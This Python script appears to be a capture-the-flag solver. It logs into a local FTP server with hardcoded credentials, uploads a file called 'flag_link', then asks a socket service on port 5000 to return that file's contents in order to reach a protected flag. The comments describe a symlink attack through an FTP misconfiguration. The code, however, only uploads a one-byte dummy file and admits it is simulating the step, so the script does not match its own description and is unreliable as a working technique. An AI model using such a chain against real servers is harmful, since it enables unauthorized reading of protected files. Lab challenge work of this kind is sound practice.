#!/usr/bin/env python3
import ftplib
import socket
import os

FTP_HOST = '127.0.0.1'
FTP_PORT = 21
SERVICE_HOST = '127.0.0.1'
SERVICE_PORT = 5000

# This solver demonstrates chaining FTP misconfig to read protected data

def upload_symlink_via_ftp():
    # Requires a vsftpd build that allows SITE SYMLINK or similar; here we simulate
    ftp = ftplib.FTP()
    ftp.connect(FTP_HOST, FTP_PORT, timeout=10)
    ftp.login('ftpuser', 'ftp123')
    try:
        ftp.mkd('uploads')
    except Exception:
        pass
    ftp.cwd('uploads')

    # Create a local file that represents a symlink name pointing to the flag path on the server
    # In the actual container, the challenge will ensure this maps correctly.
    payload_name = 'flag_link'
    with open('dummy', 'w') as f:
        f.write('x')

    with open('dummy', 'rb') as f:
        ftp.storbinary(f'STOR {payload_name}', f)

    ftp.quit()
    os.remove('dummy')
    return payload_name


def read_via_service(filename):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVICE_HOST, SERVICE_PORT))
    s.recv(1024)
    s.sendall(filename.encode() + b"\n")
    data = s.recv(8192).decode(errors='ignore')
    s.close()
    return data


def main():
    name = upload_symlink_via_ftp()
    content = read_via_service(name)
    print(content)


if __name__ == '__main__':
    main()
